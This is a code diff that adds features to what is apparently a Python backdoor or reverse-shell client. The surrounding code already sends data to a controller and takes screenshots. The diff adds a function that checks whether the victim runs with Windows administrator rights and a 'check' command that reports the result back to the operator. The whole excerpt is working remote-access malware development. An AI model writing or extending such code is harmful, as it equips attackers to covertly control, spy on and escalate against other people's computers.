@@ -23,6 +23,14 @@ def reliable_receive():
         except ValueError:
             continue
 
+def is_admin():
+    global admin
+    try:
+        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'), 'temp']))
+    except:
+        admin="User Privilages"
+    else:
+        admin="Admin Privilages"
 def screenshot():
     with mss() as screenshot:
         screenshot.shot(output="monitor-1.png")
@@ -79,6 +87,12 @@ def shell():
                 os.remove("monitor-1.png")
             except:
                 reliable_send("[-] Faild to take screenshot")
+        elif command[:5] == 'check':
+            try: 
+                is_admin()
+                reliable_send(admin)
+            except:
+                reliable_send("[-] Failed to check user privilages")
                 
         else:
             try:
